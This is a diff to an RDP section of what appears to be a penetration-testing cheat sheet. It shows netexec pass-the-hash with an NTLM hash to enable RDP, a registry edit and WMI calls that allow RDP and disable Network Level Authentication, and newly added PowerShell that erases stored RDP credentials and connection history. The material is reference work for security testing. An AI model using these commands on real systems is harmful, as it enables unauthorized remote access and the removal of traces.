@@ -263,7 +263,7 @@ class RemoteShell(cmd.Cmd):
     root@payload$ netexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
     ```
 
-* Fix CredSSP errors
+* Fix **CredSSP** errors
 
     ```ps1
     reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
@@ -278,14 +278,47 @@ class RemoteShell(cmd.Cmd):
     netexec rdp 10.10.10.10 -u user -p pass --nla-screenshot
     ```
 
-* Disable NLA
+* Disable Network Level Authentication (NLA)
 
     ```ps1
     PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired
     PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
     ```
 
-Abuse RDP protocol to execute commands remotely with the following commands;
+On Windows, the native Remote Desktop client is `mstsc.exe`.
+When launched with the `/public` switch, RDP runs in Public Mode, which uses temporary, non-persistent session settings.
+
+```ps1
+mstsc /public /v:server01
+```
+
+Public Mode is designed for shared systems, jump hosts, and security-sensitive environments, where leaving local artifacts or cached credentials would present an operational risk.
+
+When RDP is launched in Public Mode, the client will:
+
+* Not save credentials
+* Not use cached credentials
+* Not save connection history
+* Not load local RDP settings (printers, drives, clipboard, etc.)
+* Not store passwords in Credential Manager
+
+If RDP was launched without /public, local artifacts may persist.
+These can be manually removed using the following PowerShell commands.
+
+```ps1
+# Remove Stored RDP Credentials
+cmdkey /list | ? { $_ -Match "TERMSRV/" } | % { $_ -Replace ".*: " } | % { cmdkey /delete:$_ }
+
+# Remove Cached Bitmaps and Client Data
+Remove-Item -Path "$Env:LocalAppData\Microsoft\Terminal Server Client\Cache" -Recurse -ErrorAction SilentlyContinue
+
+# Remove RDP Connection History and Device Mappings
+Remove-Item -Path "HKCU:\Software\Microsoft\Terminal Server Client\Default" -Force -ErrorAction SilentlyContinue
+Remove-Item -Path "HKCU:\Software\Microsoft\Terminal Server Client\Servers" -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item -Path "HKCU:\Software\Microsoft\Terminal Server Client\LocalDevices" -Recurse -Force -ErrorAction SilentlyContinue
+```
+
+Abuse RDP protocol to execute commands remotely with the following commands:
 
 * [Pennyw0rth/netexec](https://github.com/Pennyw0rth/NetExec)
 
